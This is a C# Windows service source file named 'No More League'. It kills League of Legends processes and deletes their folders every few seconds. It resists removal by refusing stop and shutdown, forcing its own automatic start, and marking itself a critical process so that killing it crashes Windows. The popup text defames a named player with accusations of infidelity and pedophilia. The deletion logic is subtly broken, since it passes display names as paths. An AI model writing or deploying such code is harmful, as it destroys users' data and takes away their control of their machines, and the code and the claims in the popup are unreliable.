using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;
using Timer = System.Timers.Timer;

namespace nml_driver
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer();
        Timer checker = new Timer();
        public Service1()
        {
            CanStop = false;
            CanShutdown = false;
            CanPauseAndContinue = false;
            InitializeComponent();
        }

        [DllImport("wtsapi32.dll", SetLastError = true)]
        static extern bool WTSSendMessage(
                IntPtr hServer,
                [MarshalAs(UnmanagedType.I4)] int SessionId,
                String pTitle,
                [MarshalAs(UnmanagedType.U4)] int TitleLength,
                String pMessage,
                [MarshalAs(UnmanagedType.U4)] int MessageLength,
                [MarshalAs(UnmanagedType.U4)] int Style,
                [MarshalAs(UnmanagedType.U4)] int Timeout,
                [MarshalAs(UnmanagedType.U4)] out int pResponse,
                bool bWait);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private ServiceController svc = new ServiceController("No More League");
        protected override void OnStart(string[] args)
        {
            MessageBox(":)", "Enjoy your time without league!");

            Process.EnterDebugMode();
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000;
            timer.Enabled = true;

            checker.Elapsed += CheckStartup;
            checker.Interval = 1500;
            checker.Enabled = true;

            int iscrit = 1;
            int term = 0x1D;

            Process.EnterDebugMode();
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, term, ref iscrit, sizeof(int));
        }

        private void CheckStartup(object sender, ElapsedEventArgs e)
        {
            ServiceHelper.ChangeStartMode(svc, ServiceStartMode.Automatic);
        }

        public static IntPtr WTS_CURRENT_SERVER_HANDLE = IntPtr.Zero;
        public static int WTS_CURRENT_SESSION = 1;
        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            if (IsLeagueInstalled())
            {
                EraseLeague();
                MessageBox("It's gone :)", "联盟戦亡選機稿 [L9 LIE DETECTOR TECHNOLOGY ] PRESENTS.... NEW RATEARL LYING SCRIPT 100% UNDETECTE (OUTSIDE OF MAINLAND CHINA) ENJOY SUSHI + HOT ASIAN WOMAN FT. DOINB CHEATING ON HIS WIFE WITH TIKTOK GIRL! (WTF)??? 假假假 THEBAUSFFS EPSTEIN ISLAND UNCHAINED [L9 ISLAMIC RITUALS] 恋童癖者 DOINB: HALLO? AKAARI IRELIA");
            }
        }

        private void MessageBox(string title, string msg)
        {
            bool result = false;
            int tlen = title.Length;
            int mlen = msg.Length;
            int resp = 7;
            result = WTSSendMessage(WTS_CURRENT_SERVER_HANDLE, WTS_CURRENT_SESSION, title, tlen, msg, mlen, 4, 3, out resp, true);
        }

        private bool IsLeagueInstalled()
        {
            if (ProcessCheck() || DirectoryCheck() || InstalledCheck())
                return true;
            else
                return false;
        }

        private void EraseLeague()
        {
            string[] list = new string[] { "RiotClient", "League of Legends" };
            List<Process> p = Process.GetProcesses().ToList();
            foreach (Process proc in p)
            {
                if (list.Any(proc.ProcessName.Contains))
                {
                    proc.Kill();
                }
            }

            List<string> installs = new List<string>();
            List<string> keys = new List<string>() {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };

            FindInstalls(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64), keys, installs);
            FindInstalls(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64), keys, installs);

            installs = installs.Where(s => !string.IsNullOrWhiteSpace(s)).Distinct().ToList();

            foreach (string i in installs)
            {
                if (i.Contains("Riot Games") || i.Contains("League of Legends"))
                {
                    try
                    {
                        i.Replace('/', '\\');
                        if (i.Contains("Riot Games\\League of Legends"))
                        {
                            Directory.Delete(i, true);
                            Directory.Delete(i.Remove(i.LastIndexOf('\\')), true);
                        }
                        else
                        {
                            Directory.Delete(i, true);
                        }
                    }
                    catch {
                        Console.WriteLine("Couldn't delete league directory.");
                    }
                }
            }
        }

        private bool ProcessCheck()
        {
            string[] list = new string[] { "RiotClient", "League of Legends" };

            List<Process> p = Process.GetProcesses().ToList();
            foreach (Process proc in p)
            {
                if (list.Any(proc.ProcessName.Contains))
                {
                    return true;
                }
            }

            return false;
        }

        private bool DirectoryCheck()
        {
            string path = "C:\\Riot Games\\League of Legends";
            if (Directory.Exists(path))
            {
                return true;
            }
            return false;
        }

        private bool InstalledCheck()
        {
            List<string> installs = new List<string>();
            List<string> keys = new List<string>() {
                @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
            };

            FindInstalls(RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, RegistryView.Registry64), keys, installs);
            FindInstalls(RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Registry64), keys, installs);

            installs = installs.Where(s => !string.IsNullOrWhiteSpace(s)).Distinct().ToList();

            if (installs.Contains("League of Legends"))
                return true;
            else
                return false;
        }

        private static void FindInstalls(RegistryKey regKey, List<string> keys, List<string> installed)
        {
            foreach (string key in keys)
            {
                using (RegistryKey rk = regKey.OpenSubKey(key))
                {
                    foreach (string skName in rk.GetSubKeyNames())
                    {
                        using (RegistryKey sk = rk.OpenSubKey(skName))
                        {
                             installed.Add(Convert.ToString(sk.GetValue("DisplayName")));
                        }
                    }
                }
            }
        }

        private static void FindInstallsLocations(RegistryKey regKey, List<string> keys, List<string> installed)
        {
            foreach (string key in keys)
            {
                using (RegistryKey rk = regKey.OpenSubKey(key))
                {
                    foreach (string skName in rk.GetSubKeyNames())
                    {
                        using (RegistryKey sk = rk.OpenSubKey(skName))
                        {
                            installed.Add(Convert.ToString(sk.GetValue("InstallLocation")));
                        }
                    }
                }
            }
        }

        protected override void OnStop()
        {
        }
    }
}
